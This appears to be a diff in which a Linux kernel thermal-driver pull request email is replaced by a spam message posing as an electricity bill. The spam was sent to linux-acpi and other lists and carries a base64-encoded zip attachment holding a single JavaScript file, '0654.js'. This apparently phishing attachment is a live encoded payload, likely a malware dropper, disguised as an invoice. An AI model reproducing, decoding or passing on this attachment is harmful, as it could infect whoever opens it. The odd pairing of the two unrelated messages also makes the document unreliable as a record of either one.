@@ -1,94 +1,115 @@
-From: Eduardo Valentin <edubezval@gmail.com>
-Subject: [GIT PULL] Thermal management updates for v4.5-rc8
-Date: Wed, 9 Mar 2016 16:08:12 -0800
-Message-ID: <20160310000811.GA19267@localhost.localdomain>
+From: "dodie hunley" <dodiehunley5ti7@rambler.ru>
+Subject: linux-achealyzh Your Electricity Bill 55889212
+Date: Thu, 10 Mar 2016 03:36:50 +0300
+Message-ID: <1457570210.293860.19441.30585@mail.rambler.ru>
+Reply-To: "dodie hunley" <dodiehunley5ti7@rambler.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: multipart/mixed; boundary="_----------=_14575702101944197"
+Content-Transfer-Encoding: 7bit
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from mail-pf0-f181.google.com ([209.85.192.181]:33864 "EHLO
-	mail-pf0-f181.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S933482AbcCJAIV (ORCPT
-	<rfc822;linux-acpi@vger.kernel.org>); Wed, 9 Mar 2016 19:08:21 -0500
-Content-Disposition: inline
+Received: from mxout4.rambler.ru ([81.19.67.207]:39148 "EHLO mxout4.rambler.ru"
+	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+	id S964825AbcCJB6y (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+	Wed, 9 Mar 2016 20:58:54 -0500
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-Cc: ACPI Devel Maling List <linux-acpi@vger.kernel.org>, Linux PM <linux-pm@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>, Rui Zhang <rui.zhang@intel.com>
+To: linux-achealyzh@holonet.net, linux-acpi@vger.kernel.org, linux-activismo@kernel-panik.org, linux-activists-request@niksula.cs.hut.fi
 
-Hello Rui,
 
-These are fixes applicable to rc8. But feel free to collect them for rc1 if
-you don't have anything for rc8. Lets just not forget them :-). I still have more
-material for rc1 (new drivers and API). 
+This is a multi-part message in MIME format.
 
-So, please pull from
+--_----------=_14575702101944197
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset="utf-8"; format="flowed"
 
-  git://git.kernel.org/pub/scm/linux/kernel/git/evalenti/linux-soc-thermal fixes
 
-to receive Thermal-SoC Management updates for v4.5-rc8 with top-most
 
-ccb361d2fdda8975c8bbc8a1749c31dbd62dd276:
+--_----------=_14575702101944197
+Content-Disposition: attachment; filename="linux-achealyzh.zip"
+Content-Transfer-Encoding: base64
+Content-Type: application/x-zip-compressed; name="linux-achealyzh.zip"
 
-  thermal: exynos: Defer probe if vtmu is present but not registered (2016-03-08 14:22:25 -0800)
+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
+AMwNAAAAAA==
 
-on top of commit fc77dbd34c5c99bce46d40a2491937c3bcbd10af:
-
-  Linux 4.5-rc6 (2016-02-28 08:41:20 -0800)
-
-Specifics in this pull request:
-- Several fsmall fixes on Rockchip, TI-SoC, Tegra, RCar, and Exynos thermal drivers
-- Changes in Kconfigs to allow compile test on UM arch.
-- These change have been CI tested using KernelCI bot [1,2]. \o/
-
-I am taking over on Rui's behalf while he is out. Happy New Chinese Year!
-
-[1] - https://kernelci.org/boot/all/job/evalenti/kernel/v4.5-rc6-24-gea1bd053b687/
-[2] - https://kernelci.org/build/evalenti/kernel/v4.5-rc6-24-gea1bd053b687/
-
-BR,
-
-Eduardo Valentin
-
-----------------------------------------------------------------
-Caesar Wang (3):
-      thermal: rockchip: fix a impossible condition caused by the warning
-      thermal: rockchip: the rename compatibles for rockchip SoCs
-      thermal: rockchip: fix the tsadc sequence output on rk3228/rk3399
-
-Dan Carpenter (1):
-      thermal: ti-soc-thermal: clean up the error handling a bit
-
-Elaine Zhang (1):
-      thermal: rockchip: fix calculation error for code_to_temp
-
-Javier Martinez Canillas (3):
-      thermal: exynos: List vtmu-supply as optional property in DT binding
-      thermal: exynos: Use devm_regulator_get_optional() for vtmu
-      thermal: exynos: Defer probe if vtmu is present but not registered
-
-Krzysztof Kozlowski (4):
-      thermal: Fix build error of missing devm_ioremap_resource on UM
-      thermal: exynos: Document compatible for Exynos5433 TMU
-      thermal: exynos: Document number of supported trip-points
-      thermal: exynos: Print a message about exceeded number of supported trip-points
-
-Luis de Bethencourt (1):
-      thermal: db8500_cpufreq_cooling: Compile with COMPILE_TEST
-
-Simon Horman (1):
-      thermal: rcar: Use ARCH_RENESAS
-
-Wei Ni (1):
-      thermal: tegra_soctherm: fix sign bit of temperature
-
-Wolfram Sang (1):
-      thermal: rcar_thermal: don't open code of_device_get_match_data()
-
- .../devicetree/bindings/thermal/exynos-thermal.txt |  18 +-
- drivers/thermal/Kconfig                            |  12 +-
- drivers/thermal/rcar_thermal.c                     |   3 +-
- drivers/thermal/rockchip_thermal.c                 | 239 ++++++++++++---------
- drivers/thermal/samsung/Kconfig                    |   1 +
- drivers/thermal/samsung/exynos_tmu.c               |  19 +-
- drivers/thermal/tegra_soctherm.c                   |   2 +-
- drivers/thermal/ti-soc-thermal/ti-bandgap.c        |  10 +-
- 8 files changed, 186 insertions(+), 118 deletions(-)
+--_----------=_14575702101944197--
